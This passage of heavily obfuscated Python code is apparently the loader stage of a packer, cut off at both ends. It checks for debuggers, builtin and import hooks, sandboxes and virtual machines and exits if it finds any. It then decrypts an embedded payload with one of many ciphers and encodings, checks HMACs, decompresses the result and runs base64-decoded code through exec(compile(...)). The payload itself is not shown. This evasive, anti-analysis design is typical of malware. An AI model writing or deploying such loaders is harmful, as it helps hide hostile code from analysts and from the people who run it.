    _ahjsryamm = bytes.fromhex("a48184b6f6998cf4b296f7a8a08cb988a799aba086b6b4b588a7f1b397afb4a584aeafa0f281b78bf3b1f6a581818481aeada48cbb85aabaf38986a19a99a2ad92a08684a2b4b9b594a599a2a5ba81968ab1b393a48aa0858c86ae869081f3b2ab9195f19280a1aaf6f2a48e9ba586f581b9b68da5f5ab8185b1f2b3a8f0a9978cb2b18188979aa4baaea793fbf3a6a9a49aa5f5abf6a497b191aef6b3888187828fa4adb7b9f3b181fa869a99ad9492a99482a89ba789ab84849582b3f4fa9980b0f6a49bb1b08b99a2f2a5a0a8908ca9b5a1abf08790a2f189bab0aea8848d91a880f6f0a8f5fb84f78480b6ada6b0b7f4f2b68cb1f48ff2f5a1b0f6f7f290f2fab28dba99acb3a285f581a889b0a093b5f4faf3b299a481f287f180829797b7aff2a58296aa8aa0f089f1f4b384baf6f6b79691b2b1f28492a091a0b1a886a5f4b38db4f6bb9ba09baf89b78085b5f3f2f694809ba9ba8ef287f386ae8f96f388918af29086f68a94f480b3b094f49aabb08da488f19585f4a1ac89b68a8ba18fba96affa93b781b78b878982fb81b0ad8f84f090828e9aa7b4b7b3f689acf784a5f2ac91958fbbf38787ad93b2afb08096f092b7adf08fa5a6fafa8df0f588aa869b90a4f2f6b9a8a0b680a7848581b7f485b3a9baaf95b5a784a58fb6a699828289af85f08ea29ba5b4b9a08288bb92ab80f1b9f38c8e8aaa92b7f39b84f39387889aa2b58988ada0b58a8584a5b192f781bb848a8487b3f693f6a480b2a08af48cfab0f7b0ad82f3b18bb7898f85a6a5ae89bb84b5b7a8bab3bafb978bfafba2868a9090898eb7ba8eb7a1b481b1998e95b4a2a8baf586a1f5f0a4b58e918996ba868ea284a8fbf094a0f5a785ac8e94a08b90f5b99580f5f7a5abf5f7b2ad8ca48b8e81b5b68df1f185a091b6ab808187b0b7a7a2a8928190b1adad9284a48dfa80a7a1f4f69486b48df390ae87f1808d9992a58c92918899b0b2a68ef09986baa2b3b990a1fbbba588aff7968e84fa8e8481a0ba80f182abf59bf7b08bafa685ac8794858e96a585a99b80a4b9b4f497a9a8ab93b2f5f1f6faa7ab9bb5a197ab84fbf484f2959bb6bb94a8fa86f5acb2bba2f7b2959a8aab80ad9791f1b9a497b2aa88a68f99af91f59ba6ae85958c8f8cf2fbaa8eb684baaca5f6f5b1a1f5a48babb791a9a4a4a985a8a18e8d8cba819399a282fb8e8c8a86a597bb88a0f4a8b2958b878c8085b4a4f4b1a990bbad8485f6b18b8aaf8af7f3bbba95f381bab9b1f28c9293bb8580a08e87a7889aae84a48a979af194ae90848aa29987ab8dfaa2f69585fba4a5adb782a0b68285b08da286b3b9f4b9b389b0a78b85a2f69994908486a68d8685a1bbbab08c998b87a0b688ba8d8286b5b6af8ea6a7a8918bfb81b1ba8b9087b9f4ac9096faa681b494b7fba4b7a1ad9a888f94f687")
    _ahjsryamm = bytes(_ ^ 195 for _ in _ahjsryamm).decode()
    _yowcqk.breakpointhook = None
    for _qm in ('pydevd','pdb','ipdb','pdbpp','pydevconsole'):
        if _qm in _yowcqk.modules:
            _yowcqk.stderr.write('error: debugger detected\n'); _yowcqk.exit(1)
    _beeuo = _aolxjt.b64decode(_uqjsrtvu)
    for _qn in ('__import__','compile','exec'):
        _qf = getattr(_yowcqk.modules.get('builtins'), _qn, None)
        if _qf is not None:
            _qg = getattr(_qf, '__name__', '')
            if _qg != _qn:
                _yowcqk.stderr.write('error: hook detected\n'); _yowcqk.exit(1)
    if len(_yowcqk.meta_path) > 5:
        _yowcqk.stderr.write('error: import hook detected\n'); _yowcqk.exit(1)
    if getattr(_yowcqk, 'flags', None) and _yowcqk.flags.no_user_site:
        _yowcqk.stderr.write('error: sandbox detected\n'); _yowcqk.exit(1)
    import os
    if any(x in str(_yowcqk.platform) or any(y in os.listdir('/proc/sys/kernel') for y in ['//', 'vm']) for x in ['vmware', 'virtualbox', 'qemu']):
        _yowcqk.stderr.write('error: virtual machine detected\n'); _yowcqk.exit(1)
    if _gbbxoygji == 0:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _aqwgz, algorithms as _uksrrrd, modes as _wpxwa
        except ImportError:
            _yowcqk.stderr.write("error: cryptography not installed\n"); _yowcqk.exit(1)
        _kmzylih = _beeuo[:16]; _kmomqt = _beeuo[-32:]; _pjcybwy = _beeuo[16:-32]
        _gsvpqcbso = _qixxsckb.pbkdf2_hmac('sha256', _ahjsryamm.encode(), _kmzylih, 100000, dklen=64)
        _soycxw = _gsvpqcbso[:32]; _bxvwfcqa = _gsvpqcbso[32:64]
        _geuysk = _yajcbfj.new(_bxvwfcqa, _pjcybwy, digestmod='sha256').digest()
        if not _yajcbfj.compare_digest(_kmomqt, _geuysk):
            _yowcqk.stderr.write("error: integrity check failed\n"); _yowcqk.exit(1)
        _ikufg = _aqwgz(_uksrrrd.AES(_soycxw), _wpxwa.ECB())
        _mjgxhxj = _ikufg.decryptor()
        _mjgxhxj = _mjgxhxj.update(_pjcybwy) + _mjgxhxj.finalize()
        _cmnais = _mjgxhxj[-1]
        if _cmnais < 1 or _cmnais > 16 or not all(_ == _cmnais for _ in _mjgxhxj[-_cmnais:]):
            _yowcqk.stderr.write("error: decryption failed\n"); _yowcqk.exit(1)
        _mjgxhxj = _mjgxhxj[:-_cmnais]
    elif _gbbxoygji == 13:
        _kmzylih = _beeuo[:16]; _kmomqt = _beeuo[-32:]; _pjcybwy = _beeuo[16:-32]
        _gsvpqcbso = _qixxsckb.pbkdf2_hmac('sha256', _ahjsryamm.encode(), _kmzylih, 100000, dklen=80)
        _soycxw = _gsvpqcbso[:32]; _hariwrmj = _gsvpqcbso[32:48]; _bxvwfcqa = _gsvpqcbso[48:80]
        _geuysk = _yajcbfj.new(_bxvwfcqa, _pjcybwy, digestmod='sha256').digest()
        if not _yajcbfj.compare_digest(_kmomqt, _geuysk):
            _yowcqk.stderr.write("error: integrity check failed\n"); _yowcqk.exit(1)
        import struct as _vuaquw
        def _jyond(k,c,n):
            s=[0x61707865,0x3320646e,0x79622d32,0x6b206574]
            for i in range(0,32,4):s.append(_vuaquw.unpack('<I',k[i:i+4])[0])
            s.append(c&0xFFFFFFFF)
            for i in range(0,12,4):s.append(_vuaquw.unpack('<I',n[i:i+4])[0])
            w=list(s)
            def q(a,b,c,d):
                a=(a+b)&0xFFFFFFFF;d^=a;d=((d<<16)|(d>>16))&0xFFFFFFFF
                c=(c+d)&0xFFFFFFFF;b^=c;b=((b<<12)|(b>>20))&0xFFFFFFFF
                a=(a+b)&0xFFFFFFFF;d^=a;d=((d<<8)|(d>>24))&0xFFFFFFFF
                c=(c+d)&0xFFFFFFFF;b^=c;b=((b<<7)|(b>>25))&0xFFFFFFFF
                return a,b,c,d
            for _ in range(10):
                w[0],w[4],w[8],w[12]=q(w[0],w[4],w[8],w[12])
                w[1],w[5],w[9],w[13]=q(w[1],w[5],w[9],w[13])
                w[2],w[6],w[10],w[14]=q(w[2],w[6],w[10],w[14])
                w[3],w[7],w[11],w[15]=q(w[3],w[7],w[11],w[15])
                w[0],w[5],w[10],w[15]=q(w[0],w[5],w[10],w[15])
                w[1],w[6],w[11],w[12]=q(w[1],w[6],w[11],w[12])
                w[2],w[7],w[8],w[13]=q(w[2],w[7],w[8],w[13])
                w[3],w[4],w[9],w[14]=q(w[3],w[4],w[9],w[14])
            r=bytearray()
            for i in range(16):r.extend(_vuaquw.pack('<I',(s[i]+w[i])&0xFFFFFFFF))
            return bytes(r)
        _cykbflxmd = _vuaquw.unpack('<I',_hariwrmj[:4])[0]
        _hariwrmj = _hariwrmj[4:]
        _kmzylih = bytearray()
        while len(_kmzylih) < len(_pjcybwy):
            _cmnais = _jyond(_soycxw, _cykbflxmd, _hariwrmj)
            for _qjdmpjagh in range(min(64, len(_pjcybwy) - len(_kmzylih))):
                _kmzylih.append(_pjcybwy[len(_kmzylih)] ^ _cmnais[_qjdmpjagh])
            _cykbflxmd += 1
        _mjgxhxj = bytes(_kmzylih)
    elif _gbbxoygji == 11:
        _kmzylih = _beeuo[:16]; _kmomqt = _beeuo[-32:]; _pjcybwy = _beeuo[16:-32]
        _gsvpqcbso = _qixxsckb.pbkdf2_hmac('sha256', _ahjsryamm.encode(), _kmzylih, 100000, dklen=64)
        _soycxw = _gsvpqcbso[:32]; _bxvwfcqa = _gsvpqcbso[32:64]
        _geuysk = _yajcbfj.new(_bxvwfcqa, _pjcybwy, digestmod='sha256').digest()
        if not _yajcbfj.compare_digest(_kmomqt, _geuysk):
            _yowcqk.stderr.write("error: integrity check failed\n"); _yowcqk.exit(1)
        _cmnais = _soycxw[0]
        _mjgxhxj = bytearray()
        for _cykbflxmd in range(len(_pjcybwy)):
            _kmzylih = _pjcybwy[_cykbflxmd] ^ _cmnais
            _mjgxhxj.append(_kmzylih)
            _cmnais = _pjcybwy[_cykbflxmd] ^ _soycxw[ (_cykbflxmd + 1) % len(_soycxw) ]
            _cmnais = (((_cmnais << 3) & 0xFF) | (_cmnais >> 5)) ^ 0x5A
        _mjgxhxj = bytes(_mjgxhxj)
    elif _gbbxoygji == 1:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _aqwgz, algorithms as _uksrrrd, modes as _wpxwa
        except ImportError:
            _yowcqk.stderr.write("error: cryptography not installed\n"); _yowcqk.exit(1)
        _kmzylih = _beeuo[:16]; _kmomqt = _beeuo[-32:]; _pjcybwy = _beeuo[16:-32]
        _gsvpqcbso = _qixxsckb.pbkdf2_hmac('sha256', _ahjsryamm.encode(), _kmzylih, 100000, dklen=80)
        _soycxw = _gsvpqcbso[:32]; _hariwrmj = _gsvpqcbso[32:48]; _bxvwfcqa = _gsvpqcbso[48:80]
        _geuysk = _yajcbfj.new(_bxvwfcqa, _pjcybwy, digestmod='sha256').digest()
        if not _yajcbfj.compare_digest(_kmomqt, _geuysk):
            _yowcqk.stderr.write("error: integrity check failed\n"); _yowcqk.exit(1)
        _ikufg = _aqwgz(_uksrrrd.AES(_soycxw), _wpxwa.CBC(_hariwrmj))
        _mjgxhxj = _ikufg.decryptor()
        _mjgxhxj = _mjgxhxj.update(_pjcybwy) + _mjgxhxj.finalize()
        _cmnais = _mjgxhxj[-1]
        if _cmnais < 1 or _cmnais > 16 or not all(_ == _cmnais for _ in _mjgxhxj[-_cmnais:]):
            _yowcqk.stderr.write("error: decryption failed\n"); _yowcqk.exit(1)
        _mjgxhxj = _mjgxhxj[:-_cmnais]
    elif _gbbxoygji == 9:
        def _osfny(_nddmdh):
            if _nddmdh[:2] == b'<~': _nddmdh = _nddmdh[2:]
            if _nddmdh[-2:] == b'~>': _nddmdh = _nddmdh[:-2]
            _bvmejm = bytearray(); _yuuwedlrw = 0
            while _yuuwedlrw < len(_nddmdh):
                if _nddmdh[_yuuwedlrw] == 122:
                    _bvmejm.extend(b'\x00\x00\x00\x00'); _yuuwedlrw += 1; continue
                _mkwtaww = 0; _azbfi = 0
                while _yuuwedlrw < len(_nddmdh) and _azbfi < 5:
                    _mkwtaww = _mkwtaww * 85 + (_nddmdh[_yuuwedlrw] - 33); _yuuwedlrw += 1; _azbfi += 1
                _geakpn = _azbfi - 1
                if _geakpn > 0: _bvmejm.extend(_mkwtaww.to_bytes(4, 'big')[4-_geakpn:])
            return bytes(_bvmejm)
        _mjgxhxj = _osfny(_beeuo)
    elif _gbbxoygji == 3:
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _yuzeywfsg
        except ImportError:
            _yowcqk.stderr.write("error: cryptography not installed\n"); _yowcqk.exit(1)
        _kmzylih = _beeuo[:16]; _kmomqt = _beeuo[-32:]; _mjgxhxj = _beeuo[16:-32]
        _pjcybwy = _mjgxhxj[:-16]; _cmnais = _mjgxhxj[-16:]
        _gsvpqcbso = _qixxsckb.pbkdf2_hmac('sha256', _ahjsryamm.encode(), _kmzylih, 100000, dklen=76)
        _soycxw = _gsvpqcbso[:32]; _hariwrmj = _gsvpqcbso[32:44]; _bxvwfcqa = _gsvpqcbso[44:76]
        _geuysk = _yajcbfj.new(_bxvwfcqa, _mjgxhxj, digestmod='sha256').digest()
        if not _yajcbfj.compare_digest(_kmomqt, _geuysk):
            _yowcqk.stderr.write("error: integrity check failed\n"); _yowcqk.exit(1)
        _mjgxhxj = _yuzeywfsg(_soycxw).decrypt(_hariwrmj, _pjcybwy + _cmnais, None)
    elif _gbbxoygji == 8:
        _lewjm = ('0','1','2','3','4','5','6','7','8','9',
                'A','B','C','D','E','F','G','H','I','J','K','L','M',
                'N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
                'a','b','c','d','e','f','g','h','i','j','k','l','m',
                'n','o','p','q','r','s','t','u','v','w','x','y','z',
                '!','#','$','%','&','(',')','*','+','-',';','<','=',
                '>','?','@','^','_','`','{','|','}','~')
        _tghnaae = {c:i for i,c in enumerate(_lewjm)}
        def _iauiwway(_kcexzqbf):
            _hdntaiz = bytearray(); _vbjzgua = 0
            while _vbjzgua < len(_kcexzqbf):
                _cwzcx = 0; _ozamas = 0
                while _vbjzgua < len(_kcexzqbf) and _ozamas < 5:
                    _cwzcx = _cwzcx * 85 + _tghnaae[chr(_kcexzqbf[_vbjzgua])]; _vbjzgua += 1; _ozamas += 1
                _fwwkjpkrq = _ozamas - 1
                if _fwwkjpkrq > 0: _hdntaiz.extend(_cwzcx.to_bytes(4, 'big')[4-_fwwkjpkrq:])
            return bytes(_hdntaiz)
        _mjgxhxj = _iauiwway(_beeuo)
    elif _gbbxoygji == 12:
        _kmzylih = _beeuo[:16]; _kmomqt = _beeuo[-32:]; _pjcybwy = _beeuo[16:-32]
        _gsvpqcbso = _qixxsckb.pbkdf2_hmac('sha256', _ahjsryamm.encode(), _kmzylih, 100000, dklen=64)
        _soycxw = _gsvpqcbso[:32]; _bxvwfcqa = _gsvpqcbso[32:64]
        _geuysk = _yajcbfj.new(_bxvwfcqa, _pjcybwy, digestmod='sha256').digest()
        if not _yajcbfj.compare_digest(_kmomqt, _geuysk):
            _yowcqk.stderr.write("error: integrity check failed\n"); _yowcqk.exit(1)
        _cmnais = 3 + (_kmzylih[0] & 7)
        _kmzylih = bytearray(_pjcybwy)
        for _cykbflxmd in range(_cmnais - 1, -1, -1):
            _jyond = (3 + _cykbflxmd) & 7
            _qjdmpjagh = (_cykbflxmd * 0x1B + 0x5A) & 0xFF
            for _hariwrmj in range(len(_kmzylih)):
                _cmnais = _kmzylih[_hariwrmj]
                _cmnais ^= _qjdmpjagh
                _cmnais = ((_cmnais >> _jyond) | ((_cmnais << (8 - _jyond)) & 0xFF))
                _cmnais ^= _soycxw[(_cykbflxmd * len(_kmzylih) + _hariwrmj) % len(_soycxw)]
                _kmzylih[_hariwrmj] = _cmnais
        _mjgxhxj = bytes(_kmzylih)
    elif _gbbxoygji == 4:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _aqwgz, algorithms as _uksrrrd, modes as _wpxwa
        except ImportError:
            _yowcqk.stderr.write("error: cryptography not installed\n"); _yowcqk.exit(1)
        _kmzylih = _beeuo[:16]; _kmomqt = _beeuo[-32:]; _pjcybwy = _beeuo[16:-32]
        _gsvpqcbso = _qixxsckb.pbkdf2_hmac('sha256', _ahjsryamm.encode(), _kmzylih, 100000, dklen=80)
        _soycxw = _gsvpqcbso[:32]; _hariwrmj = _gsvpqcbso[32:48]; _bxvwfcqa = _gsvpqcbso[48:80]
        _geuysk = _yajcbfj.new(_bxvwfcqa, _pjcybwy, digestmod='sha256').digest()
        if not _yajcbfj.compare_digest(_kmomqt, _geuysk):
            _yowcqk.stderr.write("error: integrity check failed\n"); _yowcqk.exit(1)
        _ikufg = _aqwgz(_uksrrrd.ChaCha20(_soycxw, _hariwrmj), mode=None)
        _mjgxhxj = _ikufg.decryptor().update(_pjcybwy)
    elif _gbbxoygji == 10:
        _mjgxhxj = bytes.fromhex(_beeuo.decode('ascii'))
    elif _gbbxoygji == 5:
        _kmzylih = _beeuo[:16]; _kmomqt = _beeuo[-32:]; _pjcybwy = _beeuo[16:-32]
        _gsvpqcbso = _qixxsckb.pbkdf2_hmac('sha256', _ahjsryamm.encode(), _kmzylih, 100000, dklen=64)
        _soycxw = _gsvpqcbso[:32]; _bxvwfcqa = _gsvpqcbso[32:64]
        _geuysk = _yajcbfj.new(_bxvwfcqa, _pjcybwy, digestmod='sha256').digest()
        if not _yajcbfj.compare_digest(_kmomqt, _geuysk):
            _yowcqk.stderr.write("error: integrity check failed\n"); _yowcqk.exit(1)
        _mjgxhxj = bytes(_pjcybwy[i] ^ _soycxw[i % 32] for i in range(len(_pjcybwy)))
    elif _gbbxoygji == 6:
        _mjgxhxj = _aolxjt.b64decode(_beeuo)
    elif _gbbxoygji == 2:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _aqwgz, algorithms as _uksrrrd, modes as _wpxwa
        except ImportError:
            _yowcqk.stderr.write("error: cryptography not installed\n"); _yowcqk.exit(1)
        _kmzylih = _beeuo[:16]; _kmomqt = _beeuo[-32:]; _pjcybwy = _beeuo[16:-32]
        _gsvpqcbso = _qixxsckb.pbkdf2_hmac('sha256', _ahjsryamm.encode(), _kmzylih, 100000, dklen=80)
        _soycxw = _gsvpqcbso[:32]; _hariwrmj = _gsvpqcbso[32:48]; _bxvwfcqa = _gsvpqcbso[48:80]
        _geuysk = _yajcbfj.new(_bxvwfcqa, _pjcybwy, digestmod='sha256').digest()
        if not _yajcbfj.compare_digest(_kmomqt, _geuysk):
            _yowcqk.stderr.write("error: integrity check failed\n"); _yowcqk.exit(1)
        _ikufg = _aqwgz(_uksrrrd.AES(_soycxw), _wpxwa.CTR(_hariwrmj))
        _mjgxhxj = _ikufg.decryptor().update(_pjcybwy)
    elif _gbbxoygji == 7:
        _mjgxhxj = _aolxjt.b32decode(_beeuo)
    else:
        _yowcqk.stderr.write("error: unsupported algorithm\n"); _yowcqk.exit(1)
    _vk = bytes.fromhex("2c9894789a59eb3b888715938d44b2efec9fd5a9f5207b4258af2ec970e56a26")
    _vn = bytes.fromhex("4232f2da778833c8bb0b270cea8f3fac")
    _sig = _mjgxhxj[-32:]
    _pl = _mjgxhxj[4:-32]
    import hmac, hashlib
    if not hmac.compare_digest(_sig, hmac.new(_vk, _pl, hashlib.sha256).digest()):
        _yowcqk.stderr.write('error: VM integrity check failed\n'); _yowcqk.exit(1)
    _pd = bytes([_pl[i] ^ _vk[i % 32] ^ _vn[i % 16] for i in range(len(_pl))])
    if _mjgxhxj[1] == 1:
        import zlib as _ivmip
        _pd = _ivmip.decompress(_pd)
    elif _mjgxhxj[1] == 2:
        import lzma as _ivmip
        _pd = _ivmip.decompress(_pd)
    elif _mjgxhxj[1] == 3:
        import bz2 as _ivmip
        _pd = _ivmip.decompress(_pd)
    elif _mjgxhxj[1] == 4:
        import brotli as _ivmip
        _pd = _ivmip.decompress(_pd)
    elif _mjgxhxj[1] == 5:
        import zstandard as _ivmip
        _pd = _ivmip.decompress(_pd)
    elif _mjgxhxj[1] == 6:
        import gzip as _ivmip
        _pd = _ivmip.decompress(_pd)
    elif _mjgxhxj[1] == 7:
        import lz4.frame as _ivmip
        _pd = _ivmip.decompress(_pd)
    elif _mjgxhxj[1] == 8:
        import snappy as _ivmip
        _pd = _ivmip.decompress(_pd)
    elif _mjgxhxj[1] == 9:
        import gzip as _ivmip
        _pd = _ivmip.decompress(_pd)
    elif _mjgxhxj[1] == 10:
        import blosc as _ivmip
        _pd = _ivmip.decompress(_pd)
    else:
        pass
    _c, _k, _m, _map, _ok, _ht, _pf = _vm_deserialize(_pd)
    exec(compile(_aolxjt.b64decode("aW1wb3J0IGJhc2U2NAppbXBvcnQgaGFzaGxpYgppbXBvcnQgaG1hYwppbXBvcnQgY3R5cGVzCmltcG9ydCBiYXNlNjQKaW1wb3J0IGhhc2hsaWIKaW1wb3J0IGhtYWMKaW1wb3J0IGN0eXBlcwpfRlVOQ19LRVkgPSBiYXNlNjQuYjY0ZGVjb2RlKCcvMlNnYmZjQ01LV1FVVlBOZWxnSHh6eWFReWJNWVhVTmptSnZlNmhVYkhzPScpCl9GRU5DX0RBVEEgPSBbYmFzZTY0LmI2NGRlY29kZSgnNEcwWWNPZHRiU2NZcVh1QjloZ0dHSWlMc1BSOXBFbFhobUpsYlI0UlNxUS81SGlrUjNqei82R3NxV1YvU3htMWcxUUR4N1Z1SUNFdUlTdGwxeUJyY01zTmFuaFM2aHRHeTlEcVhvWEo5blU5V2djeEFoYmZZUXhSZkdSbGd1dmdWS01aOG5CNzRaVEhaNmVTdE9XWGh0dFFGLytHaE9oTFAzK2lPM2hIQ3Y3aHpOQ09rTVNtaUw3UDh3NFRYUEhrRlJEUEM1MUxVR2I4dGttUFlzVHZLOU4rNmgwSXYwTlNhemtTNk1Xc21nbkNTTStWTGlpM21VNWhpSnhQazF3czl2emVXa3YweThtSkJVVXc1ZVZRWkJRcDZNb1h1d2U1VG0zbTlxcHcxN085VXJxSS82S0lLdHNFaUE9PScpLCBiYXNlNjQuYjY0ZGVjb2RlKCdZOVF1amc0SDhpZGlsTlczb09SVTlocUFjY1VCZVZaMllLYzcrSEcxS0VhN2JSRTAxQ2xwRlcvWm02NjZlSlhQZ0N4MTR6ZDd6MjczQzVGV1JPY2g2M09LbWtHdnZmc1NGZDZqVTBKY3RrcWxnankyUStaS2VCTEZXMW14WTl1K2JsdEFLUmdEcC9GVVU2RVVpUjlDL2p4UUI5WGtaZktLcDYrWUthNE1pN0tYenM4TlA2NGFFNS9ibDN0clZyUW5HK0VHSnVXaG5kbzN4OTI2NXVseUowUnM2WThwL0d2LzlXWE5CWDRwbzlEWU96dUZUVXFoMGh2N0pIdHdSbVl1L3lXYVNqT3NiK2RJWlUyeWZ0NDdmY054Zi9GalpsNElyTGg1UktFPScpLCBiYXNlNjQuYjY0ZGVjb2RlKCdRMnAwbGIxekRjSTZLa2Nta2hYM3kzUXFYd00yNWRyRGROV2t0TWdxVzlZdjVGbjFQb1h4V2xGa3BUNWs4Nmt3Z0E0dnNlM3RsRlFOTG9vdytZZ0xDa2VMZlVHMSt2YlJCK2ROVGlxL2wwR0FUNUVWK3ZQSUE2WHl5Z1o5TGFOVHdtNGhPUGs5bDlFZW9zSUtNUEVqemI5Z2RVOVFIMHNjY0J6QlJhSk11VWVQb1NwZmtjUTROTXgzd2poUTRhcXlkR3dLellMVC9FVTBiSUhwaGEvQWlUYlk2YVcxSEZOakFia0ordm1QejNFUFhkamtENHhiOW1iWkt0ZFVsYk0xd3NiZDZLdjJKL1JRdG5reVIwMmFLQm5jMldIUFFEOWsrR2ZQelBtRm9ndmhoVHU0UXA3dTZ5VT0nKSwgYmFzZTY0LmI2NGRlY29kZSgnNGRKZ09udFZ2aW5Ld1BibGNpdE5VRVRzQ2NCZGh0TkV4WlM2YVdiMFNiTVF3dENxekUwZFExcDUxYXZsWUZyUDV4RVlyRDZxbHFGc2ZXWFlxNVZ2RTczODFES05lNEtYSkpMQkdYU1I1VVJOQlhHV3E4WWRWK2hOd3JDNzlYY0Ria1UxRFVWb05adUh1ZjJzM1g0UEFUSkE5blhBN3U0SUkxT3llcGhtUy9Jdm41cnNuV1Awd0YraU04VGo2OWVwSzhRMktNR1Jwc252dVJhQ2VSYmRYcDBBc09kQWZhTW5lOXU5bGRBV2IwZFArT0RvUnlSUSt1VHlaWk1nUHVkWXRDWkQ5aDhES3lHYjNYeHBHQWpoYWVKY2VGeHUya2pOQjV3YkV6VTlXVk5xQnBGSnhlQmxBT0lvdGgrUHhWWkJkWjNLODNlNURiT1lQbUZjR2wxRW9hR0o3bDhLNS9tNlc2SXVlTmV0ZEtQMTR3enZtTkN4Skc4VG9SdUVrUU5rZjdwTzNtYXk4dERnQ2doQjRQaDB6MmZja1Y4cHhVWEQzSVFBazhqK3hXK1NBU1U2YkdVYmtCTnBYL3h2c0FJSnErLy9GMUZNZzcwbXBmSFdkWm5ZVzg1L2lnNmkxSkh5czNaYnpmQklrdUtSbmVQbFppaHA2ekxKdHptOXE2eThVeDcrMStkV25BZnJRaTZXakJNUkxHbDZTNmpWWUdIYkFhbDZBUlpEUkdzaktnaHUvZHRoaVJiT29HMmFESUJ1c1daTFBrUFZXN0VwMENqMnZCbGJ4TmZhQlUwZFlCZ3c2YjV6enM5b290OUkzVE5xejExL3dQSmRXYkhKZjdMdmR3bWFDa0RCUVNGa285aldsQ0lMSkhsaE5pYW13Rm1GWTRSb2hJK2ZCZnV2aldTbUJDT1JxK3hicmUrK1oyK3NncVl1U3lMUVhCWkw0M3dxVzNBTnh5Q0I1dk1iVENXSndPejVjakx5Rno4SVZhRDNFZGpYMW9wRjFGRU8rVEZaMmJoV2tWRjk5Q2d4YmNiMlFma2NrTlhod0hKajltbHp2WGJrSU1Ocm1ERzBFOXJFdTlwYW5qcEhwWm4zcWMyZWMxTnN3RENERWo2TkduS2Y4TVJwYm1SdlZJTVJ6NTBzWHc3d0J5Z1NDRmc4UHBJNjJQRWMvckNicGVYOTJhRG01QUQrRmwxSURZMVUzSHVjbnNvQ1ZMSUU0ekQ4ZGFjS1ZvaWthb2ZVVktxK2h1dk5tR05tZ2I3WHdsQlFxMnUwV2pkQzNFVFZNbW1XVWsyUXBRdEgvV0h5RHUzMmtkZEZHVWVGN3I2cTF6U0o2bVFJaFRsZzdrVzN1RlZRRUZnRmZSeE9DSTc4OEZDTW12aGxMTzJiQlZId0tRZjZ4ZHBJdzE1WVcxenpsZG9ZKzdBRk5zWDMxRVB5K0dUYTFKcFdDVTdsdUlpMWNKakpMeDdCZTNkejBIZUFOV2djbU9vNnd2cEc2UWU1WUowVDFRdTdWVmtnVnNTbmhaRmh5TlZzVHMrZmZzYkUrZ0Q4bDB3SWtLZDVRaWZOdXVLK21Way8vdTJ3S3lKVDFpVzcvc1FReE9oWFpFRXdodUM5T0VWdTY2cGtTc2dENGlNOVE4dHYrSlp0VnFTQjhseGVLQmxNN3JSOUF5WTlqcElzZlpESmk0ZUZ6MUFrSGtrNXZIUXJjVjFkVEVyWW1BT3YyWXg1Q3hEc1p1ZlphaDQ0ZXlaRC85WmIvcHhIaVdDUk1RUFF0RHF2eGlPV1dSQWtjOEdleWI2WEI3S2lJSnJCSjE3STdjdTIyOCtRVkNjaGdJWWlCa2VOVXlCNmpWdUh4WUMzQlVvcDNybEt2TCtQbHVkelVNMUppaGlqbVAxa2EvVFJIZVFtU2pXVHk0SnFZcmwzODZINnBaRllHWGV3aDlQL0czRzhGb1pIWi9JVWlLNTJXVld5NVlQWUwvL3pDM1I0Q3h0c3pDeWFZV2ZoODNjTnJES0VJZitER29TUHp1NHNXSmIvYXQ5bDc1eG9mK3VEN1pwT0s5bDNqQTVyQlBLeTYyYk55cnU1dC9TOHcxcjdvT1hTMHhXNiszTEhwNWpDMU8xdnp4cVU1UHdKS3JncmdkNEhreitNU3RvenJIOFdWV0Fpb2dBVHc2cnNSZDVaL1ZOK25hVVpZZTBVK25LQkVGMEpVOWVaYXUzMWJGblVrRzhEZnVGVjY0ME1CaHZoOVRsdGR3ZS8vSVJySVlNZTI4eFMwYTdOZ1ZnUzIyb3pRMVlVWW80U3N6TUtwcWtILzFtRXN5cmxwLzh5UHFjNUNRU2lSZjBQRFk5NldUUlFka3hrSkRSQXZLRnJRaE4zNEJrK1F1OXBPMkZZUUdNWkJTZzZQa1V5N0ptZDlOSmpJUDk3MFZsQW9CSUdFSGptQ0FkSWNQYnBXcHZKWE1NcHdXNDlJcldMaFJONzFkYmx1Y28zdjJJbnAyQTg0bEZWWTFFSEVmcUk1OXlwZnpteUZ1N3lJVTJJSCt1L1JWcnJFTE1rNG42cHllYlU0bC9yNzBLQVN0ZGNUaENVOVUrcEtaSG9WZ21mbjhoSG9WUTBJWDJiNzJXdnRMTVpVZElFSnloTnI2bjVYVURsU2UyTHd0ZFpmN0JwdUpBcC9lT0ZJRS96NHNPMGhKeDlmcGJ0SVp0UC9Wb2J1b3AxU0F2OGJ3eUU3dEZWZzczMittaGkrbkdSc0lsYmE4UExpL3ZGTEw5UHZpQTkvUCsxcFoxQWhrYmxFazBzU0dqRXdUMXZYVGdQT0FnQ2VtMlBGNkkrVy85SU44VTRIOE5oblJ4SmdoZldmck55RVJHQWIwZjEreGVESGIwbzV0L2thTldYaEE0Mzd4eXN1Q1lBVFVHb2NIYkNSQld4WlNnSStvUWd3akVUemlVTFFSZHNQRVZ3WnpIWDJVenpvaWkxU1pyODd2MkdpMG42Ukp2ZUo0UkR3dnhVSmttbHExN3RFN2VaNHpMVHJhdCtGYVNKZzZRaTQvaHllLzZoZExDVmVOYmRsY2llZ1ljUDMzanNMQVVObEVLVEo0Vm56RGpDVURlVTdEMHJrOWNzWEc0cjB1WHlSUUhONWVhUUdIcC9Tams4bGkrK3pIVXVnTXFWQUFad0lzZVRyNm13UXhnSWVvaWpZN3FKRVE3RDBJQUNNU2lJcjF1RlBvR2FFeFgyM2twNlhQRy91T09xelQ3dlZheFFUNkJ2eFdQR1VZdXJaRWphZkRpd1VZOWYwd1Fvc1NiTkVPcmZZYmxkNHQyczJueXlsTElUQUdBdW40di92MlZkc0pGREEyMmUzbWNPRkxlNUdKdkZ2SnNzUDJEVTZub2IwMWNmQ09iMFJvOFcxS0NtSjVRYXdBemlkTGdFQWpoMGVIMlpuZ000bTBISGo2OTZ2a1ZDWjFrTEVMVmFIR080NldCWnFLWWkwV0hVZEk5WjFqTys2QlhZWnUwVm9xNzZ0N0ZDRDF1dHFSckZ3anJPNC9KTXpoMnFyZ2xDOTZ4SVRwQ0M2MU91YVFaQ01EWDM0M0xOUkcxdllIODFBSEI5NEdoZnJvbDZYWWQ2SzQ2Q1JUM1dQUkFlajFtM3FhNFhVSTNVRTRrK25OSEN2L2xIbVh0b29KRU1KcWRnYTFvK0ZSM2UySE9NQz